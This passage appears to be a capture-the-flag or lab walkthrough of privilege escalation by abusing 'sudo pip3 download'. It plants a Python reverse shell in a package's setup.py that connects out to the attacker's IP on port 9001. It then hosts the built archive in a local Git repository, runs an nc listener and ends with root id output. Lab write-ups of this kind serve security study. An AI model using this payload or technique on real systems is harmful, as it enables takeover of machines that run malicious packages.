    long_description_content_type="text/markdown",
    url="https://github.com/",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
```

we can insert a reverse shell from https://www.revshells.com/ :

```python
import sys,socket,os,pty
RHOST="10.10.14.10"
RPORT=9001
s=socket.socket()
s.connect( RHOST,RPORT)
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")
```

then create  a source distribution package :

python setup.py sdist

The archive "mytest-0.0.1.tar.gz" is build in dist directory.

We can download this archive  in the target repository :

![[Pasted image 20230904223842.png]]

We can then commit this change.

![[Pasted image 20230904223927.png]]

We can notice the lock next to the repository name :

![[Pasted image 20230904224005.png]]

This indicate a private repository. We can turn it as public : settings, then uncheck "This repository is pravate"

![[Pasted image 20230904224141.png]]

The repository is now publicly accessible :

![[Pasted image 20230904224227.png]]

Start a reverse shell listener :
rlwrap nc -vnlp 9001

And execute the sudo command to gain elevated privileges :
sudo pip3 download http://127.0.0.1:3000/john/Test/raw/master/mytest-0.0.1.tar.gz

```shell
# id
id
uid=0(root) gid=0(root) groups=0(root)
```
